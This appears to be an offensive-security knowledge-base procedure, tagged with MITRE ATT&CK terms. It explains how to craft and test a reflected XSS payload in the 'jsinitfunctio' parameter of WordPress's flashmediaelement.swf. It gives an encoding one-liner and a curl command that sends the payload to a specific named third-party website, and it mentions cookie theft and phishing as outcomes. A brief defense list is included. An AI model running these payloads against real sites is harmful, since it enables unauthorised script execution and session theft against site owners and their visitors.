---
id: proc-craft-xss-jsinitfunctio
tags:
  - xss
  - payload-injection
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-test-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:26.629Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft and Test XSS Payload in jsinitfunctio Parameter

## Summary

This procedure crafts an encoded JavaScript payload for the 'jsinitfunctio' parameter in flashmediaelement.swf, tests it to achieve reflected XSS, and demonstrates arbitrary code execution like alerting in the browser.

## Description

The 'jsinitfunctio' parameter in the SWF file allows injection of JavaScript callbacks without sanitization, leading to reflected XSS when the URL is accessed. In a WordPress context, this can be embedded in pages using media players. The approach involves URL-encoding payloads (e.g., %25 for %, %60 for `) to bypass basic filters. Prerequisites include endpoint identification; outcomes are JavaScript execution, potentially for stealing cookies or phishing.

## Requirements

1. Confirmed vulnerable endpoint from prior reconnaissance
2. URL encoding knowledge for payload obfuscation
3. Browser or curl for testing execution

## Defense

Defensive measures and detection strategies:

- Sanitize all URL parameters in SWF/JS files with whitelisting
- Remove or update Flash-based media elements to HTML5 equivalents
- Use WAF rules to block encoded JavaScript in query strings
- Log and alert on anomalous SWF parameter access

## Objectives

1. Bypass sanitization with encoded payload
2. Trigger JavaScript execution in victim context
3. Validate impact like session theft potential

## Instructions

### Step 1: Encode the Payload

**Context**: Create a simple XSS payload like alert(1) and encode it to evade filters, using %25gn=alert%601%60 as an example bypass.

**Command** ([[commands/url-encode-payload]]):
```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('gn=alert`1`'))"
```

> This encodes the payload. Expected output: gn%3Dalert%601%60 (adjust for specific bypass like %25gn=alert%601%60).

### Step 2: Inject and Test in URL

**Context**: Append the encoded payload to the SWF URL and access it to reflect and execute the script.

**Command** ([[commands/curl-test-xss-payload]]):
```bash
curl "https://www.veris.in/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio=%25gn=alert%601%60" -v
```

> This tests the request verbosely. For execution, open in browser; expected output is an alert popup. Use developer tools to inspect if script runs in page context.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/url-encode-payload]]
- [[commands/curl-test-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[payload-injection]]
- [[JavaScript]]
